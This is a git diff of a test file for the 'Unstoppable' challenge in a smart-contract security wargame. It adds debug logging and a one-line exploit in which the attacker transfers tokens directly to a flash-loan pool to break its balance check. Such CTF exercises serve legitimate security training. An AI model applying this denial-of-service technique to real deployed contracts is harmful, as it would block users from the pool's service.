@@ -16,6 +16,7 @@ describe('[Challenge] Unstoppable', function () {
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
 
+        // what is this ?? 
         this.token = await DamnValuableTokenFactory.deploy();
         this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
 
@@ -32,6 +33,8 @@ describe('[Challenge] Unstoppable', function () {
             await this.token.balanceOf(attacker.address)
         ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
 
+        console.log(await this.token.balanceOf(this.pool.address), "before");
+
          // Show it's possible for someUser to take out a flash loan
          const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
          this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
@@ -40,6 +43,14 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        console.log((await this.token.balanceOf(attacker.address)).toString(), "attacker");
+
+        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        console.log((await this.pool.poolBalance()).toString(), "after");
+
+
+
     });
 
     after(async function () {
